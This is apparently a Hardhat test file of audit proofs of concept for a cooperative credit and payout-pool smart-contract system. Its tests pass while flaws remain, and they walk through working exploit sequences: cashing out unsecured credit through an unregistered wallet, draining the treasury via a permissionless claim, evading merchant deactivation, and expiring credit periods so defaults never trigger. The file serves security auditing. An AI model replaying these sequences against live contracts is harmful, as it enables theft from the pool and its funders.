import { expect } from "chai";
import { ethers, upgrades } from "hardhat";
import { deployPhase0Network } from "../helpers/phase0-fixture";

/*
 * Audit proofs of concept. Each test PASSES when the vulnerability is present.
 */
const ONE_USDC = 10n ** 6n;
const DAY = 24 * 60 * 60;
const CYCLE = 30 * DAY;
const NET_30 = 30 * DAY;

async function advance(seconds: number) {
  await ethers.provider.send("evm_increaseTime", [seconds]);
  await ethers.provider.send("evm_mine", []);
}

describe("AUDIT PoC", function () {
  let ctx: Awaited<ReturnType<typeof deployPhase0Network>>;
  let revolving: any, term: any, registry: any, pool: any;
  let coop: any, merchant: any, funder: any, attackerWallet: any, member2: any;

  beforeEach(async function () {
    ctx = await deployPhase0Network();
    const s = await ethers.getSigners();
    [coop, merchant, funder, attackerWallet, member2] = [s[8], s[9], s[10], s[11], s[12]];

    const RevolvingIssuer = await ethers.getContractFactory("RevolvingIssuer");
    revolving = await upgrades.deployProxy(
      RevolvingIssuer, [await ctx.stableCredit.getAddress(), coop.address], { kind: "uups" });
    const TermIssuer = await ethers.getContractFactory("TermIssuer");
    term = await upgrades.deployProxy(
      TermIssuer, [await ctx.stableCredit.getAddress(), coop.address], { kind: "uups" });

    for (const issuer of [revolving, term]) {
      await ctx.networkRegistry.registerIssuer(
        await issuer.getAddress(), await ctx.stableCredit.getAddress(),
        await ctx.assurancePool.getAddress(), await ctx.assuranceOracle.getAddress());
      await ctx.access.grantOperator(await issuer.getAddress());
    }
    for (const [name, rate] of [["SAVINGS", 0n], ["ASSET_INTERNAL", 65n], ["INCOME", 150n], ["BOOST", 300n]] as const) {
      await revolving.connect(ctx.operator).addTier(ethers.encodeBytes32String(name), rate, CYCLE);
    }

    const MerchantRegistry = await ethers.getContractFactory("MerchantRegistry");
    registry = await upgrades.deployProxy(MerchantRegistry, [ctx.admin.address, NET_30], { kind: "uups" });
    const PayoutPool = await ethers.getContractFactory("PayoutPool");
    pool = await upgrades.deployProxy(PayoutPool, [
      ctx.admin.address, await ctx.stableCredit.getAddress(), await ctx.usdc.getAddress(),
      await registry.getAddress(), coop.address], { kind: "uups" });
    await pool.grantRole(await pool.FUNDER_ROLE(), funder.address);
    await ctx.stableCredit.connect(ctx.admin).setPayoutPool(await pool.getAddress());
    await registry.registerMerchant(merchant.address, NET_30, 50_000n * ONE_USDC, 250n);
    for (const who of [coop, merchant]) await ctx.access.connect(ctx.operator).grantMember(who.address);
    // The receiving wallet is a second ordinary paid member (an accomplice, a partner, or the same
    // person's own merchant account). Nothing about it is privileged.
    await ctx.access.connect(ctx.operator).grantMember(attackerWallet.address);

    // Working capital in the pool, as in production (fund_payout_pool.ts).
    await ctx.usdc.mint(funder.address, 100_000n * ONE_USDC);
    await ctx.usdc.connect(funder).approve(await pool.getAddress(), ethers.MaxUint256);
    await pool.connect(funder).fund(20_000n * ONE_USDC);
  });

  it("C-1a: a term-limit member cashes out their whole unsecured limit and can never be defaulted", async function () {
    const m = ctx.member;
    // Underwritten on income: no plan opened, no purchase made.
    await term.connect(ctx.operator).setTermLimit(m.address, 5_000n * ONE_USDC);

    // Member sends ledger credit to a wallet they control (not a registered merchant).
    await ctx.stableCredit.connect(m).transfer(attackerWallet.address, 5_000n * ONE_USDC);
    await ctx.stableCredit.connect(attackerWallet).approve(await pool.getAddress(), ethers.MaxUint256);
    await pool.connect(attackerWallet).redeem(5_000n * ONE_USDC);

    expect(await ctx.usdc.balanceOf(attackerWallet.address)).to.equal(5_000n * ONE_USDC);
    expect(await ctx.stableCredit.creditBalanceOf(m.address)).to.equal(5_000n * ONE_USDC);

    // Two years later: no plan, no arrears, no period -> nothing can ever declare a default.
    await advance(730 * DAY);
    expect(await term.totalPrincipalOf(m.address)).to.equal(0n);
    expect(await term.totalArrearsOf(m.address)).to.equal(0n);
    await expect(term.declareDefault(m.address)).to.be.revertedWithCustomError(term, "TermIssuerNotDefaultable");
    expect(await term.inDefault(m.address)).to.equal(false);
    // ...and no carry ever accrued on it either.
    expect(await ctx.stableCredit.creditBalanceOf(m.address)).to.equal(5_000n * ONE_USDC);
  });

  it("C-1b: a revolving member cashes out an unsecured INCOME/BOOST line through an unregistered wallet", async function () {
    const m = ctx.member;
    await revolving.connect(ctx.operator).openLine(m.address, [0n, 0n, 2_000n * ONE_USDC, 1_000n * ONE_USDC], 0, CYCLE);
    await ctx.stableCredit.connect(m).transfer(attackerWallet.address, 3_000n * ONE_USDC);
    await ctx.stableCredit.connect(attackerWallet).approve(await pool.getAddress(), ethers.MaxUint256);
    const [paidNow] = await pool.connect(attackerWallet).redeem.staticCall(3_000n * ONE_USDC);
    await pool.connect(attackerWallet).redeem(3_000n * ONE_USDC);
    expect(paidNow).to.equal(true);
    expect(await ctx.usdc.balanceOf(attackerWallet.address)).to.equal(3_000n * ONE_USDC);
    expect(await registry.isRegistered(attackerWallet.address)).to.equal(false);
  });

  it("C-1c: an unfunded pool still pays the attacker after 30 days by borrowing from the treasury", async function () {
    // Drain the pre-funded capital first so the pool is empty.
    await pool.connect(funder).withdrawCapital(20_000n * ONE_USDC, funder.address);
    const m = ctx.member;
    await revolving.connect(ctx.operator).openLine(m.address, [0n, 0n, 2_000n * ONE_USDC, 0n], 0, CYCLE);
    await ctx.stableCredit.connect(m).transfer(attackerWallet.address, 2_000n * ONE_USDC);
    await ctx.stableCredit.connect(attackerWallet).approve(await pool.getAddress(), ethers.MaxUint256);
    await pool.connect(attackerWallet).redeem(2_000n * ONE_USDC); // queued

    // Treasury Safe has an allowance to the pool (scripts/command/approve_treasury_caps.ts).
    await ctx.usdc.mint(coop.address, 10_000n * ONE_USDC);
    await ctx.usdc.connect(coop).approve(await pool.getAddress(), 10_000n * ONE_USDC);
    await advance(NET_30 + 1);
    await pool.connect(attackerWallet).drawForDueClaim(); // permissionless
    expect(await ctx.usdc.balanceOf(attackerWallet.address)).to.equal(2_000n * ONE_USDC);
  });

  it("H-1: a deactivated merchant bypasses deactivation by moving its balance to a fresh wallet", async function () {
    await term.connect(ctx.operator).setTermLimit(ctx.member.address, 1_000n * ONE_USDC);
    await term.connect(ctx.operator).openPlan(
      ctx.member.address, merchant.address, 1_000n * ONE_USDC, 975n * ONE_USDC, 150n, CYCLE, 4, CYCLE);
    await registry.setActive(merchant.address, false);
    await ctx.stableCredit.connect(merchant).approve(await pool.getAddress(), ethers.MaxUint256);
    await expect(pool.connect(merchant).redeem(1n)).to.be.revertedWithCustomError(pool, "PayoutPoolMerchantInactive");

    await ctx.stableCredit.connect(merchant).transfer(attackerWallet.address, 975n * ONE_USDC);
    await ctx.stableCredit.connect(attackerWallet).approve(await pool.getAddress(), ethers.MaxUint256);
    await pool.connect(attackerWallet).redeem(975n * ONE_USDC);
    expect(await ctx.usdc.balanceOf(attackerWallet.address)).to.equal(975n * ONE_USDC);
  });

  it("H-2: anyone can delete a compliant member's period at expiry; the line then runs forever with no default", async function () {
    const m = ctx.member;
    await revolving.connect(ctx.operator).openLine(m.address, [0n, 0n, 2_000n * ONE_USDC, 0n], 0, CYCLE);
    // Cycle and grace run out while compliant (balance zero).
    await advance(CYCLE + CYCLE + 1);
    // Permissionless: anyone (the member themself) expires it before the hourly renewer runs.
    await revolving.connect(attackerWallet).syncCreditPeriod(m.address);
    const [issuedAt, expiration] = await revolving.creditPeriods(m.address);
    expect(issuedAt).to.equal(0n);
    expect(expiration).to.equal(0n); // renewer skips wallets with issuedAt == 0

    // Draw the whole line and sit on it for a year.
    await ctx.stableCredit.connect(m).transfer(attackerWallet.address, 2_000n * ONE_USDC);
    await advance(365 * DAY);
    await revolving.syncCreditPeriod(m.address);
    expect(await revolving.inDefault(m.address)).to.equal(false);
    expect(await revolving.isFrozen(m.address)).to.equal(false);
    expect(await ctx.access.isMember(m.address)).to.equal(true);
    // Still free to draw again after repaying, indefinitely.
  });
});
